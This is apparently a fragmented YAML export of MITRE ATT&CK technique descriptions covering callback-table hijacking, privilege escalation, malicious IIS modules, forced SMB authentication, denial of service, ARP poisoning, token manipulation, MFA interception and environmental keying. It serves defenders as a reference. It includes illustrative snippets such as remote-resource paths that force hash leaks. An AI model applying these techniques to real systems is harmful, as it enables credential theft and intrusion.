      NtQueryInformationProcess) Once the pointer is located, the <code>KernelCallbackTable</code>
      can be duplicated, and a function in the table (e.g., <code>fnCOPYDATA</code>)
      set to the address of a malicious payload (ex: via <code>WriteProcessMemory()</code>).
      The PEB is then updated with the new address of the table. Once the tampered
      function is invoked, the malicious payload will be triggered.(Citation: Lazarus

      The tampered function is typically invoked using a Windows message. After the
      process is hijacked and malicious code is executed, the <code>KernelCallbackTable</code>
      may also be restored to its original state by the rest of the malicious payload.(Citation:

    name: Exploitation for Privilege Escalation
    description: 'Adversaries may exploit software vulnerabilities in an attempt to
      elevate privileges. Exploitation of a software vulnerability occurs when an
      adversary takes advantage of a programming error in a program, service, or within
      the operating system software or kernel itself to execute adversary-controlled
      code. Security constructs such as permission levels will often hinder access
      to information and use of certain techniques, so adversaries will likely need
      to perform privilege escalation to include use of software exploitation to circumvent
      those restrictions.


      When initially gaining access to a system, an adversary may be operating within
      a lower privileged process which will prevent them from accessing certain resources
      on the system. Vulnerabilities may exist, usually in operating system components
      and software commonly running at higher permissions, that can be exploited to
      gain higher levels of access on the system. This could enable someone to move
      from unprivileged or user level permissions to SYSTEM or root permissions depending
      on the component that is vulnerable. This could also enable an adversary to
      move from a virtualized environment, such as within a virtual machine or container,
      onto the underlying host. This may be a necessary step for an adversary compromising
      an endpoint system that has been properly configured and limits other privilege
      escalation methods.


      Adversaries may bring a signed vulnerable driver onto a compromised machine

      Information Services (IIS) web servers to establish persistence. IIS provides
      several mechanisms to extend the functionality of the web servers. For example,
      Internet Server Application Programming Interface (ISAPI) extensions and filters
      can be installed to examine and/or modify incoming and outgoing IIS web requests.
      Extensions and filters are deployed as DLL files that export three functions:
      <code>Get{Extension/Filter}Version</code>, <code>Http{Extension/Filter}Proc</code>,
      and (optionally) <code>Terminate{Extension/Filter}</code>. IIS modules may also

      Adversaries may install malicious ISAPI extensions and filters to observe and/or
      modify traffic, execute commands on compromised machines, or proxy command and
      control traffic. ISAPI extensions and filters may have access to all IIS web
      requests and responses. For example, an adversary may abuse these mechanisms
      to modify HTTP responses in order to distribute malicious commands/content to
      previously comprised hosts.(Citation: Microsoft ISAPI Filter Overview 2017)(Citation:

      Adversaries may also install malicious IIS modules to observe and/or modify
      traffic. IIS 7.0 introduced modules that provide the same unrestricted access
      to HTTP requests and responses as ISAPI extensions and filters. IIS modules
      can be written as a DLL that exports <code>RegisterModule</code>, or as a .NET
      application that interfaces with ASP.NET APIs to access IIS HTTP requests.(Citation:

    name: Forced Authentication
    description: 'Adversaries may gather credential material by invoking or forcing
      a user to automatically provide authentication information through a mechanism
      in which they can intercept.


      The Server Message Block (SMB) protocol is commonly used in Windows networks
      for authentication and communication between systems for access to resources
      and file sharing. When a Windows system attempts to connect to an SMB resource
      it will automatically attempt to authenticate and send credential information
      for the current user to the remote system. (Citation: Wikipedia Server Message
      Block) This behavior is typical in enterprise environments so that users do
      not need to enter credentials to access network resources.


      Web Distributed Authoring and Versioning (WebDAV) is also typically used by
      Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is
      an extension of HTTP and will typically operate over TCP ports 80 and 443. (Citation:
      Didier Stevens WebDAV Traffic) (Citation: Microsoft Managing WebDAV Security)


      Adversaries may take advantage of this behavior to gain access to user account
      hashes through forced SMB/WebDAV authentication. An adversary can send an attachment
      to a user through spearphishing that contains a resource link to an external
      server controlled by the adversary (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)),
      or place a specially crafted file on navigation path for privileged accounts
      (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed
      by victim(s). When the user''s system accesses the untrusted resource it will
      attempt authentication and send information, including the user''s hashed credentials,
      over SMB to the adversary controlled server. (Citation: GitHub Hashjacking)
      With access to the credential hash, an adversary can perform off-line [Brute
      Force](https://attack.mitre.org/techniques/T1110) cracking to gain access to
      plaintext credentials. (Citation: Cylance Redirect to SMB)


      There are several different ways this can occur. (Citation: Osanda Stealing
      NetNTLM Hashes) Some specifics from in-the-wild use include:


      * A spearphishing attachment containing a document with a resource that is automatically
      loaded when the document is opened (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)).
      The document can include, for example, a request similar to <code>file[:]//[remote
      address]/Normal.dotm</code> to trigger the SMB request. (Citation: US-CERT APT
      Energy Oct 2017)

      * A modified .LNK or .SCF file with the icon filename pointing to an external
      reference such as <code>\\[remote address]\pic.png</code> that will force the
      system to load the resource when the icon is rendered to repeatedly gather credentials.

      in both security descriptors and access tokens. (Citation: Microsoft SID) An

      network devices or internal devices responsible for network segmentation. Breaching
      these devices may enable an adversary to bypass restrictions on traffic routing
      that otherwise separate trusted and untrusted networks.


      Devices such as routers and firewalls can be used to create boundaries between
      trusted and untrusted networks.  They achieve this by restricting traffic types
      to enforce organizational policy in an attempt to reduce the risk inherent in
      such connections.  Restriction of traffic can be achieved by prohibiting IP
      addresses, layer 4 protocol ports, or through deep packet inspection to identify
      applications.  To participate with the rest of the network, these devices can
      be directly addressable or transparent, but their mode of operation has no bearing
      on how the adversary can bypass them when compromised.


      When an adversary takes control of such a boundary device, they can bypass its
      policy enforcement to pass normally prohibited traffic across the trust boundary
      between the two separated networks without hinderance.  By achieving sufficient
      rights on the device, an adversary can reconfigure the device to allow the traffic
      they want, allowing them to then further achieve goals such as command and control
      via [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003) or exfiltration
      of data via [Traffic Duplication](https://attack.mitre.org/techniques/T1020/001).

      see files related to the applications they commonly used to do work, so they
      are a useful target for exploit research and development because of their high
      utility.


      Several types exist:


      ### Browser-based Exploitation


      Web browsers are a common target through [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)
      and [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Endpoint

      being targeted by links in spearphishing emails to adversary controlled sites
      used to exploit the web browser. These often do not require an action by the
      user for the exploit to be executed.


      ### Office Applications


      Common office and productivity applications such as Microsoft Office are also
      targeted through [Phishing](https://attack.mitre.org/techniques/T1566). Malicious
      files will be transmitted directly as attachments or through links to download
      them. These require the user to open the document or file for the exploit to
      run.


      ### Common Third-party Applications


      Other applications that are commonly seen or are part of the software deployed
      in a target network may also be used for exploitation. Applications such as
      Adobe Reader and Flash, which are common in enterprise environments, have been
      routinely targeted by adversaries attempting to gain access to systems. Depending
      on the software and nature of the vulnerability, some may be exploited in the
      browser or require the user to open a file. For instance, some Flash exploits
      have been delivered as objects within Microsoft Office documents.

    name: Endpoint Denial of Service
    description: 'Adversaries may perform Endpoint Denial of Service (DoS) attacks
      to degrade or block the availability of services to users. Endpoint DoS can
      be performed by exhausting the system resources those services are hosted on
      or exploiting the system to cause a persistent crash condition. Example services
      include websites, email services, DNS, and web-based applications. Adversaries
      have been observed conducting DoS attacks for political purposes(Citation: FireEye
      OpPoisonedHandover February 2016) and to support other malicious activities,
      including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism,
      and extortion.(Citation: Symantec DDoS October 2014)


      An Endpoint DoS denies the availability of a service without saturating the
      network used to provide access to the service. Adversaries can target various
      layers of the application stack that is hosted on the system used to provide
      the service. These layers include the Operating Systems (OS), server applications
      such as web servers, DNS servers, databases, and the (typically web-based) applications
      that sit on top of them. Attacking each layer requires different techniques
      that take advantage of bottlenecks that are unique to the respective components.
      A DoS attack may be generated by a single system or multiple systems spread
      across the internet, which is commonly referred to as a distributed DoS (DDoS).


      To perform DoS attacks against endpoint resources, several aspects apply to
      multiple methods, including IP address spoofing and botnets.


      Adversaries may use the original IP address of an attacking system, or spoof
      the source IP address to make the attack traffic more difficult to trace back
      to the attacking system or to enable reflection. This can increase the difficulty
      defenders have in defending against the attack by reducing or eliminating the
      effectiveness of filtering by the source address on network defense devices.


      Botnets are commonly used to conduct DDoS attacks against networks and services.
      Large botnets can generate a significant amount of traffic from systems spread
      across the global internet. Adversaries may have the resources to build out
      and control their own botnet infrastructure or may rent time on an existing
      botnet to conduct an attack. In some of the worst cases for DDoS, so many systems
      are used to generate requests that each one only needs to send out a small amount
      of traffic to produce enough volume to exhaust the target''s resources. In such
      circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly
      difficult. Botnets have been used in some of the most high-profile DDoS attacks,
      such as the 2012 series of incidents that targeted major US banks.(Citation:
      USNYAG IranianBotnet March 2016)


      In cases where traffic manipulation is used, there may be points in the global
      network (such as high traffic gateway routers) where packets can be altered
      and cause legitimate clients to execute code that directs network packets toward
      a target in high volume. This type of capability was previously used for the
      purposes of web censorship where client HTTP traffic was modified to include
      a reference to JavaScript that generated the DDoS code to overwhelm target web
      servers.(Citation: ArsTechnica Great Firewall of China)

      (Citation: Fifield Blocking Resistent Communication through domain fronting
      2015) Domain fronting involves using different domain names in the SNI field
      of the TLS header and the Host field of the HTTP header. If both domains are
      served from the same CDN, then the CDN may route to the address specified in
      the HTTP header after unwrapping the TLS header. A variation of the the technique,

      the fronting to work even when the CDN attempts to validate that the SNI and
      HTTP Host fields match (if the blank SNI fields are ignored).


      For example, if domain-x and domain-y are customers of the same CDN, it is possible
      to place domain-x in the TLS header and domain-y in the HTTP header. Traffic

      or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).


      The ARP protocol is used to resolve IPv4 addresses to link layer addresses,
      such as a media access control (MAC) address.(Citation: RFC826 ARP) Devices
      in a local network segment communicate with each other by using link layer addresses.
      If a networked device does not have the link layer address of a particular networked
      device, it may send out a broadcast ARP request to the local network to translate
      the IP address to a MAC address. The device with the associated IP address directly
      replies with its MAC address. The networked device that made the ARP request
      will then use as well as store that information in its ARP cache.


      An adversary may passively wait for an ARP request to poison the ARP cache of
      the requesting device. The adversary may reply with their MAC address, thus
      deceiving the victim by making them believe that they are communicating with
      the intended networked device. For the adversary to poison the ARP cache, their
      reply must be faster than the one made by the legitimate IP address owner. Adversaries
      may also send a gratuitous ARP reply that maliciously announces the ownership
      of a particular IP address to all the devices in the local network segment.


      The ARP protocol is stateless and does not require authentication. Therefore,
      devices may wrongly add or update the MAC address of the IP address in their
      ARP cache.(Citation: Sans ARP Spoofing Aug 2003)(Citation: Cylance Cleaver)

      \ Cisco IOS Shellcode) (Citation: Cisco IOS Forensics Developments) (Citation:\
      \ Juniper Netscreen of the Dead) Some network devices are built with a monolithic\
      \ architecture, where the entire operating system and most of the functionality\
      \ of the device is contained within a single file.  Adversaries may change this\
      \ file in storage, to be loaded in a future boot, or in memory during runtime.\n\
      \nTo change the operating system in storage, the adversary will typically use\
      \ the standard procedures available to device operators. This may involve downloading\
      \ a new file via typical protocols used on network devices, such as TFTP, FTP,\
      \ SCP, or a console connection.  The original file may be overwritten, or a\
      \ new file may be written alongside of it and the device reconfigured to boot\
      \ to the compromised image.\n\nTo change the operating system in memory, the\
      \ adversary typically can use one of two methods. In the first, the adversary\
      \ would make use of native debug commands in the original, unaltered running\
      \ operating system that allow them to directly modify the relevant memory addresses\
      \ containing the running operating system.  This method typically requires administrative\
      \ level access to the device.\n\nIn the second method for changing the operating\
      \ system in memory, the adversary would make use of the boot loader. The boot\
      \ loader is the first piece of software that loads when the device starts that,\
      \ in turn, will launch the operating system.  Adversaries may use malicious\
      \ code previously implanted in the boot loader, such as through the [ROMMONkit](https://attack.mitre.org/techniques/T1542/004)\
      \ method, to directly manipulate running operating system code in memory.  This\
      \ malicious code in the bootloader provides the capability of direct memory\
      \ manipulation to the adversary, allowing them to patch the live operating system\
      \ during runtime.\n\nBy modifying the instructions stored in the system image\
      \ file, adversaries may either weaken existing defenses or provision new capabilities\
      \ that the device did not have before. Examples of existing defenses that can\
      \ be impeded include encryption, via [Weaken Encryption](https://attack.mitre.org/techniques/T1600),\
      \ authentication, via [Network Device Authentication](https://attack.mitre.org/techniques/T1556/004),\
      \ and perimeter defenses, via [Network Boundary Bridging](https://attack.mitre.org/techniques/T1599).\
      \  Adding new capabilities for the adversary\u2019s purpose include [Keylogging](https://attack.mitre.org/techniques/T1056/001),\
      \ [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003), and [Port\
      \ Knocking](https://attack.mitre.org/techniques/T1205/001).\n\nAdversaries may\
      \ also compromise existing commands in the operating system to produce false\
      \ output to mislead defenders.   When this method is used in conjunction with\
      \ [Downgrade System Image](https://attack.mitre.org/techniques/T1601/002), one\
      \ example of a compromised system command may include changing the output of\
      \ the command that shows the version of the currently running operating system.\
      \  By patching the operating system, the adversary can change this command to\
      \ instead display the original, higher revision number that they replaced through\
      \ the system downgrade. \n\nWhen the operating system is patched in storage,\
      \ this can be achieved in either the resident storage (typically a form of flash\
      \ memory, which is non-volatile) or via [TFTP Boot](https://attack.mitre.org/techniques/T1542/005).\
      \ \n\nWhen the technique is performed on the running operating system in memory\
      \ and not on the stored copy, this technique will not survive across reboots.\
      \  However, live memory modification of the operating system can be combined\
      \ with [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) to achieve\

      A Network DoS will occur when the bandwidth capacity of the network connection
      to a system is exhausted due to the volume of malicious traffic directed at
      the resource or the network connections and network devices the resource relies
      on. For example, an adversary may send 10Gbps of traffic to a server that is
      hosted by a network with a 1Gbps connection to the internet. This traffic can
      be generated by a single system or multiple systems spread across the internet,
      which is commonly referred to as a distributed DoS (DDoS).


      To perform Network DoS attacks several aspects apply to multiple methods, including
      IP address spoofing, and botnets.


      Adversaries may use the original IP address of an attacking system, or spoof
      the source IP address to make the attack traffic more difficult to trace back

    description: 'Adversaries may modify access tokens to operate under a different

      Windows uses access tokens to determine the ownership of a running process.
      A user can manipulate access tokens to make a running process appear as though
      it is the child of a different process or belongs to someone other than the
      user that started the process. When this occurs, the process also takes on the
      security context associated with the new token.


      An adversary can use built-in Windows API functions to copy access tokens from
      existing processes; this is known as token stealing. These token can then be
      applied to an existing process (i.e. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001))
      or used to spawn a new process (i.e. [Create Process with Token](https://attack.mitre.org/techniques/T1134/002)).
      An adversary must already be in a privileged user context (i.e. administrator)
      to steal a token. However, adversaries commonly use token stealing to elevate
      their security context from the administrator level to the SYSTEM level. An
      adversary can then use a token to authenticate to a remote system as the account
      for that token if the account has appropriate permissions on the remote system.(Citation:
      Pentestlab Token Manipulation)


      Any standard user can use the <code>runas</code> command, and the Windows API
      functions, to create impersonation tokens; it does not require access to an
      administrator account. There are also other mechanisms, such as Active Directory
      fields, that can be used to modify access tokens.

    description: "Adversaries may target multi-factor authentication (MFA) mechanisms,\
      \ (i.e., smart cards, token generators, etc.) to gain access to credentials\
      \ that can be used to access systems, services, and network resources. Use of\
      \ MFA is recommended and provides a higher level of security than usernames\
      \ and passwords alone, but organizations should be aware of techniques that\
      \ could be used to intercept and bypass these security mechanisms. \n\nIf a\
      \ smart card is used for multi-factor authentication, then a keylogger will\
      \ need to be used to obtain the password associated with a smart card during\
      \ normal use. With both an inserted card and access to the smart card password,\
      \ an adversary can connect to a network resource using the infected system to\
      \ proxy the authentication with the inserted hardware token. (Citation: Mandiant\
      \ M Trends 2011)\n\nAdversaries may also employ a keylogger to similarly target\
      \ other hardware tokens, such as RSA SecurID. Capturing token input (including\
      \ a user's personal identification code) may provide temporary access (i.e.\
      \ replay the one-time passcode until the next value rollover) as well as possibly\
      \ enabling adversaries to reliably predict future authentication values (given\
      \ access to both the algorithm and any seed values used to generate appended\
      \ temporary codes). (Citation: GCN RSA June 2011)\n\nOther methods of MFA may\
      \ be intercepted and used by an adversary to authenticate. It is common for\
      \ one-time codes to be sent via out-of-band communications (email, SMS). If\
      \ the device and/or service is not secured, then it may be vulnerable to interception.\
      \ Service providers can also be targeted: for example, an adversary may compromise\

      \ Therefore, compromise of the token can grant the adversary access to resources\
      \ of other sites through a malicious application.(Citation: okta)\n\nFor example,\

      \ Roles)\n\nDirect API access through a token negates the effectiveness of a\
      \ second authentication factor and may be immune to intuitive countermeasures\

    name: Environmental Keying
    description: 'Adversaries may environmentally key payloads or other features of
      malware to evade defenses and constraint execution to a specific target environment.
      Environmental keying uses cryptography to constrain execution or actions based
      on adversary supplied environment specific conditions that are expected to be
      present on the target. Environmental keying is an implementation of [Execution
      Guardrails](https://attack.mitre.org/techniques/T1480) that utilizes cryptographic
      techniques for deriving encryption/decryption keys from specific types of values
      in a given computing environment.(Citation: EK Clueless Agents)


      Values can be derived from target-specific elements and used to generate a decryption
      key for an encrypted payload. Target-specific values can be derived from specific
      network shares, physical devices, software/software versions, files, joined
      AD domains, system time, and local/external IP addresses.(Citation: Kaspersky
      Gauss Whitepaper)(Citation: Proofpoint Router Malvertising)(Citation: EK Impeding
      Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic
      Malware) By generating the decryption keys from target-specific environmental
      values, environmental keying can make sandbox detection, anti-virus detection,
      crowdsourcing of information, and reverse engineering difficult.(Citation: Kaspersky
      Gauss Whitepaper)(Citation: Ebowla: Genetic Malware) These difficulties can
      slow down the incident response process and help adversaries hide their tactics,
      techniques, and procedures (TTPs).


      Similar to [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027),
      adversaries may use environmental keying to help protect their TTPs and evade
      detection. Environmental keying may be used to deliver an encrypted payload
      to the target that will use target-specific values to decrypt the payload before
      execution.(Citation: Kaspersky Gauss Whitepaper)(Citation: EK Impeding Malware
      Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware)(Citation:
      Demiguise Guardrail Router Logo) By utilizing target-specific values to decrypt
      the payload the adversary can avoid packaging the decryption key with the payload
      or sending it over a potentially monitored network connection. Depending on
      the technique for gathering target-specific values, reverse engineering of the
      encrypted payload can be exceptionally difficult.(Citation: Kaspersky Gauss
      Whitepaper) This can be used to prevent exposure of capabilities in environments
      that are not intended to be compromised or operated within.


      Like other [Execution Guardrails](https://attack.mitre.org/techniques/T1480),
      environmental keying can be used to prevent exposure of capabilities in environments
      that are not intended to be compromised or operated within. This activity is
      distinct from typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497).
      While use of [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497)
      may involve checking for known sandbox values and continuing with execution
      only if there is no match, the use of environmental keying will involve checking
      for an expected target-specific value that must match for decryption and subsequent
      execution to be successful.
